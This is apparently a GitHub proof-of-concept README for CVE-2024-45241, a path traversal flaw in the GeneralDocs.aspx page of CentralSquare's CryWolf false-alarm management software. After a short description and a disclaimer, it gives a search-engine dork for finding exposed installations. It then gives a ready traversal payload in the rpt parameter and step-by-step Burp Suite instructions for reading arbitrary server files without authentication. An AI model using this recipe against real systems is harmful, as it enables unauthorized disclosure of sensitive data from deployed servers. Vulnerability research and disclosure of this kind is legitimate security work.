# POC - CVE-2024-45241: Path Traversal in CentralSquare's CryWolf

[![My Shop](https://img.shields.io/badge/My%20Shop-verylazytech-%23FFDD00?style=flat&logo=buy-me-a-coffee&logoColor=yellow)](https://buymeacoffee.com/verylazytech/extras)
[![Medium](https://img.shields.io/badge/Medium-%40verylazytech-%231572B6?style=flat&logo=medium&logoColor=white)](https://medium.com/@verylazytech)
[![Github](https://img.shields.io/badge/Github-verylazytech-%23181717?style=flat&logo=github&logoColor=white)](https://github.com/verylazytech)
[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-verylazytech-%23FFDD00?style=flat&logo=buy-me-a-coffee&logoColor=yellow)](https://buymeacoffee.com/verylazytech)

## Vulnerability Overview

CVE Identifier: CVE-2024-45241

Product: CentralSquare CryWolf (False Alarm Management)

Affected Component: GeneralDocs.aspx

Vulnerability Type: Path Traversal

Discovery Date: 2024-08-09

## Description
A path traversal vulnerability has been identified in the GeneralDocs.aspx component of CentralSquare CryWolf, a False Alarm Management system. This vulnerability allows unauthenticated attackers to exploit the rpt parameter to access files outside of the intended web directory. This can lead to the disclosure of sensitive information.

**Read about it** — [CVE-2024-45241](https://nvd.nist.gov/vuln/detail/CVE-2024-45241)

> **Disclaimer**: This Proof of Concept (POC) is made for educational and ethical testing purposes only. Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

## Technical Details
### Path Traversal Vulnerability:

Path traversal vulnerabilities occur when an application allows users to manipulate file paths in a way that allows them to access files and directories outside the intended directory. This is often achieved by using sequences like ../ (dot-dot-slash) to traverse directories.

### Affected Component:

In this case, the affected component is GeneralDocs.aspx. This ASP.NET page appears to handle document requests or generation based on parameters provided by the user.

### Parameter in Question:

The rpt parameter is used to specify which document or report should be processed or retrieved. The vulnerability arises because this parameter is not properly sanitized or validated, allowing attackers to manipulate it to traverse directories.

### Exploitation:

#### Finding Targets

To find potential targets, use Fofa (similar to Shodan.io):

- **Fofa Dork**: "Powered by CryWolf"

![Fofa](Fofa%20CVE-2024-45421.png)

#### Enter your browser:

Turn on Burp and start to intercept.

Type in the URL search:

```bash
<TARGET_URL>/GeneralDocs.aspx?rpt=../../../../../<FILE>
```
![Url+LFI](Url+LFI.png)

#### Return to burp:

Now you will see the original request of <TARGET_URL>/GeneralDocs.aspx?rpt=../../../../../<FILE> and click forward:

![Alt text](GenralDocs.png)

Click forward until you see this message (GET request to gdoc1.ashx):

![Alt text](gdoc1.png)

Now right click and click on "Do intercept" --> "Response to this request" then click forward.

![intercept](Do%20intercept.png)

You can see the response and the file content!

![Response](Response.png)

